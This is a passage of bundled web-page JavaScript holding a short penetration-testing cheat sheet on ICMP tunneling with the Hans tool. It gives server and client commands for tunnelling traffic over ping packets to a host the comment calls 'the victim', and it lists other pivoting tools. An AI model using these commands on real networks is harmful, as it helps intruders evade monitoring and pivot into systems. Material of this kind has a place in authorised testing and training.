"),e("h1",{attrs:{id:"icmp-tunneling"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#icmp-tunneling"}},[t._v("#")]),t._v(" ICMP Tunneling"),e("ins")]),t._v(" "),e("h2",{attrs:{id:"hans"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#hans"}},[t._v("#")]),t._v(" Hans"),e("ins")]),t._v(" "),e("p",[e("ins",[t._v("https://github.com/friedrich/hans")]),t._v(" "),e("ins",[t._v("https://github.com/albertzak/hanstunnel")])]),t._v(" "),e("p",[t._v("Root is needed in both systems to create tun adapters and tunnels data between them using ICMP echo requests.")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th"),t._v(" "),e("th")])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("1"),e("br"),e("br"),t._v("2"),e("br"),e("br"),t._v("3")]),t._v(" "),e("td",[e("code",[t._v(".``/hans")]),t._v(" "),e("code",[t._v("-``v")]),t._v(" "),e("code",[t._v("-f -s 1.1.1.1 -p P@ssw0rd")]),t._v(" "),e("code",[t._v("#Start listening (1.1.1.1 is IP of the new vpn connection)")]),e("br"),e("br"),e("code",[t._v(".``/hans")]),t._v(" "),e("code",[t._v("-f -c <server_ip> -p P@ssw0rd -``v")]),e("br"),e("br"),e("code",[t._v("ping")]),t._v(" "),e("code",[t._v("1.1.1.100")]),t._v(" "),e("code",[t._v("#After a successful connection, the victim will be in the 1.1.1.100")])])])])]),t._v(" "),e("h1",{attrs:{id:"other-tools-to-check"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#other-tools-to-check"}},[t._v("#")]),t._v(" Other tools to check"),e("ins")]),t._v(" "),e("ul",[e("li",[e("ins",[t._v("https://github.com/securesocketfunneling/ssf")])]),t._v(" "),e("li",[e("ins",[t._v("https://github.com/z3APA3A/3proxy")])]),t._v(" "),e("li",[e("ins",[t._v("https://github.com/jpillora/chisel")])])])])}),[],!1,null,null,null);e.default=v.exports}}]);